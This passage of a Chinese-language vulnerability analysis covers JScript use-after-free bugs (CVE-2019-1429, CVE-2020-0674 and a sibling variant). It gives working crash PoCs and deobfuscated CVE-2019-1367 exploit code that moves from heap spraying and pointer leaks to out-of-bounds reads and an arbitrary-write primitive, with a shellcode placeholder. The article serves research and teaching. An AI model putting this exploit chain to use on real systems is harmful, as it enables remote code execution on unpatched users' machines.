
这个漏洞是一个由`Array.sort()`函数导致的UAF漏洞。Jscript代码没有将`sort()`函数中的`arguments`属性加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

### CVE-2019-1429

第3个漏洞是CVE-2019-1429，这个漏洞对应的PoC如下：

```javascript
var spray = new Array();

function uaf() {
    // arguments未被GC追踪
    for (var i = 0; i < 20000; i++) {
        spray[i] = new Object();
    }

    arguments[0] = spray[5000];

    for (var i = 0; i < 20000; i++) {
        spray[i] = 1;
    }

    CollectGarbage();
    alert(arguments[0]); // <- 触发crash
}

var o = {toJSON: uaf}
JSON.stringify(o);
```

这个漏洞是一个由`toJSON()`函数导致的UAF漏洞。Jscript代码没有将`toJSON()`函数中的`arguments`属性加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

细心的读者肯定已经发现了，这和CVE-2019-1367不就是同一个漏洞吗？是的，它们就是同一个漏洞，但是微软就是没有补好。

### CVE-2020-0674

最后一个漏洞是CVE-2020-0674，我们来看一下这个漏洞的PoC：

```javascript
var depth = 0;
var spray_size = 10000;
var spray = new Array();
var sort = new Array();
var total = new Array();

for(i = 0; i < 110; i++) sort[i] = [0, 0];
for(i = 0; i < spray_size; i++) spray[i] = new Object();

function uaf(arg1, arg2) {
    // arg1, arg2等传入的参数未被GC追踪
    arg1 = spray[depth * 2];
    arg2 = spray[depth * 2 + 1];
    if(depth > 50) {
        spray = new Array();
        CollectGarbage();
        total.push(arg1);
        total.push(arg2);
        return 0;
    }

    depth += 1;
    sort[depth].sort(uaf);
    return 0;
}

sort[depth].sort(uaf);

for(i = 0; i < total.length; i++) {
    typeof total[i]; // <- 触发crash
}
```

这个漏洞和CVE-2019-1367又非常像，又一个由`Array.sort()`函数导致的UAF漏洞，所不同的是这次的问题不是出在`arguments`属性，而是出在传入的参数中。Jscript代码没有将`sort()`函数中的调用参数加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

### 一个“新漏洞”

相信许多读者和笔者一样，看上面几个案例后，会下意识地找一下通过Json序列化操作触发CVE-2020-0674的路径，并构造出第5个PoC：

```javascript
var depth = 0;
var spray_size = 10000;
var spray = new Array();
var arr = new Array();
var total = new Array();

for(i = 0; i < 110; i++) arr[i] = [0, 0];
for(i = 0; i < spray_size; i++) spray[i] = new Object();

function uaf(arg1, arg2) {
    // arg1, arg2等传入的参数未被GC追踪
    arg1 = spray[depth * 2];
    arg2 = spray[depth * 2 + 1];
    if(depth > 50) {
        spray = new Array();
        CollectGarbage();
        total.push(arg1);
        total.push(arg2);
        return 0;
    }

    depth += 1;
    JSON.stringify(arr[depth], uaf);
    return 0;
}

JSON.stringify(arr[depth], uaf);

for(i = 0; i < total.length; i++) {
    typeof total[i]; // <- 触发crash
}
```

事实上，这个PoC确实可以导致Crash，是CVE-2020-0674的兄弟漏洞，但是在CVE-2020-0674的补丁出来后，此类UAF已经无法触发。

读者看完上述5个PoC后，是不是感觉微软在修补此类漏洞时显得很不专业？微软应该在一开始就将此类漏洞从根本上修复，这样就不会有这么多补丁绕过漏洞。事实上，Ivan Fratric在上述几个漏洞出现之前就发出过相关警告，并且在漏洞出现后也发表过感慨，喜欢考古的读者可以看一下文末参考链接“补丁分析”部分的两个推特链接。

## CVE-2019-1367利用代码分析

在本小节中，笔者将分享CVE-2019-1367利用代码的一些细节，之所以选择CVE-2019-1367，一方面是因为国外已经有研究员写过[相关分析](https://bbs.kanxue.com/elink@6f8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5$3!0F1k6X3W2S2L8Y4c8Q4x3X3g2U0L8$3#2Q4x3V1k6A6L8Y4c8W2M7X3&6W2N6q4)9J5k6r3g2^5M7r3I4G2M7X3g2J5i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5g2)9J5k6o6p5K6y4U0N6Q4x3X3c8W2P5s2m8D9L8$3W2@1j5i4c8A6L8$3&6Q4x3X3c8H3j5i4u0@1i4K6u0V1x3W2)9J5k6o6R3I4y4o6x3J5y4o6u0T1y4e0M7^5x3l9`.`.)，但文章过长，且文内代码经过混淆，不易阅读，笔者结合手上资料对相关代码进行了解混淆，以便于阅读；另一方面是因为4个漏洞的利用代码大同小异，举一例即可。

以下只分析32位下的利用代码，为保持一致，代码中出现的注释复用国外分析文章中的注释。随笔者一起来看一下如何只用单个UAF漏洞即实现远程代码执行。

首先回顾下32位下`variant`在内存中的数据结构：

```
// total size 0x10 bytes

struct VAR {
    QWORD type;    // 8 bytes
    void* obj_ptr; // 4 bytes
    VAR next_var;  // 4 bytes
}
```

### 从UAF到越界读取

利用代码首先在内存中布局一定数量的`RegExp`对象（作为参数的`reSrc`大有玄机，后面会再次提及）：

```javascript
var refsLimit = 2 * 100 - 1;

for(var i = 0; i < refsLimit; i++)
    rrefs[i] = new RegExp(reSrc); // <--- spray with pattern text "reSrc"
```

随后借助UAF漏洞，用经典的Jscript UAF占位手法（详情可参考笔者对CVE-2018-8353的分析文章），将一个原本表示`RegExp`对象的`variant`的`type`域从`0x81`（对象）修改为`0x03`（number），从而将一个`RegExp`对象指针以整数形式泄露出来：

```javascript
function makeVariant(vt, dword1, dword2) {
    var charCodes = new Array();

    charCodes.push(vt, 0x00, 0x00, 0x00, dword1 & 0xFFFF, (dword1 >> 16) & 0xFFFF, dword2 & 0xFFFF, (dword2 >> 16) & 0xFFFF);

    return String.fromCharCode.apply(null , charCodes);
}

var reallocPropertyName = "\u0000\u0000";

while(reallocPropertyName.length < 0x17a)
    reallocPropertyName += makeVariant(0x0082);

reallocPropertyName += "\u0003";

// ... code skipped ...

dummyArrs[0].sort(FreeingComparator);
var srcs = new Array();

for(var i = 0; i < refsLimit; i++)
    try {
        throw erefs[i];
    } catch(e) {
        srcs[i] = e.source;
    }

var leakIndex = -1;
for(var i = 0; i < refsLimit; i++)
    try {
        if((typeof nrefs[i]) === "number") {
            leakIndex = i;
            break;
        }
    } catch(e) {}

if(leakIndex == -1)
    throw new Error("Could not find RegExp address.");
else {}
```

得到`RegExp`对象指针后，借助`makeVariant()`函数将`RegExpObj+4`的地方封装为一个字符串`variant(type=0x82)`的指针部分，并再次借助漏洞将其布局到内存：

```javascript
var leakRegExpObj = nrefs[leakIndex] & 0xFFFFFFFF;

var extendPropertyName = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0082, leakRegExpObj + 4); // string 4 bytes ahead, leakRegExpObj is previous fake VAR of type number (0x3)

for(var i = refsLimit; i >= leakIndex; i--)
    nrefs[i] = null;

for(var i = 0; i < 0x1000; i++)
    propHolders[i][extendPropertyName] = 1; // store the property name

while(--leakIndex >= 0)
    try {
        if((typeof nrefs[leakIndex]) === "string" && nrefs[leakIndex].length > 0x1000)
            break;
        else
            nrefs[leakIndex] = null;
    }
    catch(e) {}

if(leakIndex == -1)
    throw new Error("Could not find RegExp leak string.");
else {}
```

搜索到对应的字符串`variant`后，此时的`variant.obj_ptr`指向一个伪造的BSTR对象的字符串部分，这个BSTR对象的`length`部分为`RegExpObj`的虚表，是一个非常大的值；`str`部分为`RegExpObj+0x04`。到这里已经具备了越界读取能力，随后借助这一越界读取能力读取整个`RegExpObj`的内容并保存到`fakeRegExpCharCodes`数组，并在数组的最后为shellcode预留了位置（`0xCCCC`）：

```javascript
var bstrVal = 8;
var sizeof_RegExpObj = 0xC0;
var m_pvarMaster = 0x10;
var m_varCode = 0x38;
var m_varSrc = 0x48;

// ... code skipped ...

// here nrefs[leakIndex].length value is faulty and points to a large number
// nrefs[leakIndex].charCodeAt(i) can be used to read arbitrary bytes.
var fakeRegExpCharCodes = new Array();

fakeRegExpCharCodes.push((nrefs[leakIndex].length * 2) & 0xFFFF);
fakeRegExpCharCodes.push(((nrefs[leakIndex].length * 2) >> 16) & 0xFFFF);

for(var i = 0; i < sizeof_RegExpObj / sizeof_WCHAR; i++)
    fakeRegExpCharCodes.push(nrefs[leakIndex].charCodeAt(i));

fakeRegExpCharCodes[m_pvarMaster / sizeof_WCHAR] = 0;
fakeRegExpCharCodes[(m_pvarMaster / sizeof_WCHAR) + 1] = 0;

for(var i = 0; i < sizeof_VAR / sizeof_WCHAR; i++) {
    fakeRegExpCharCodes[m_varCode / sizeof_WCHAR + i] = fakeRegExpCharCodes[m_varSrc / sizeof_WCHAR + i];
    fakeRegExpCharCodes[m_varSrc / sizeof_WCHAR + i] = 0;
}

for(var i = 0; i < shellcode.length; i++)
    fakeRegExpCharCodes.push(0xCCCC);

var fakeRegExpStr = String.fromCharCode.apply(null, fakeRegExpCharCodes);
```

### 从越界读取到任意地址写

前面已经从内存中“dump”出一个完整的`RegExpObj`（一共dump了`sizeof_RegExpObj+4`字节），接下来是整个利用过程的精彩部分，跟随笔者一起来看一下利用代码如何借助正则表达式对象构造一个完美的任意地址写入原语。

要理解这一过程，首先需要了解下`RegExpObj`的一些成员。`RegExpObj`在32位下的大小为`0xC0`，其中比较重要的几个成员如下：

- `RegExpObj+0x10`：这里保存着一个地址，该地址指向一个`type=0x81`的`variant`，此`variant`指向当前`RegExpObj`。
- `RegExpObj+0x38`：这里保存着一个`type=0x80`（间接引用）的`variant`，该`variant.obj_ptr`进一步指向一个`type=0x08`（字符串）的`variant`，该`variant.obj_ptr`指向一个`RegExpExec`对象首部，`RegExpExec`对象首部是一个`0x4b74614e`魔术值，接着是一个头部，然后是一个与正则pattern相对应的字符串。
- `RegExpObj+0x48`：这里保存着一个`type=0x08`（字符串）的`variant`，该`variant.obj_ptr`指向一个BSTR对象，此BSTR对象保存着与正则文本域相对应的字符串。但需要注意的是，这个地方的`variant`只有在调用`RegExp.source()`后才会得到初始化。

如上面代码所示，利用借助`fakeRegExpCharCodes`数组修改了上述`RegExpObj+0x10`和`RegExpObj+0x38`处的变量，首先将`RegExpObj+0x10`开始的4字节置为空，然后将`RegExpObj+0x48`处的`0x10`字节拷贝到`RegExpObj+0x38`处，即替换了对应的`variant`。为什么要这么做？这就涉及到本小节最前面的那句`new RegExp(reSrc)`。原来，攻击者传给`RegExp`的`reSrc`参数是一个精心设计的`RegExpExec`，经过上面的替换后`RegExpObj+0x38`处的`RegExpExec`已经变成一个伪造的`RegExpExec`，后面正是借助这个伪造的`RegExpExec`实现任意地址写。
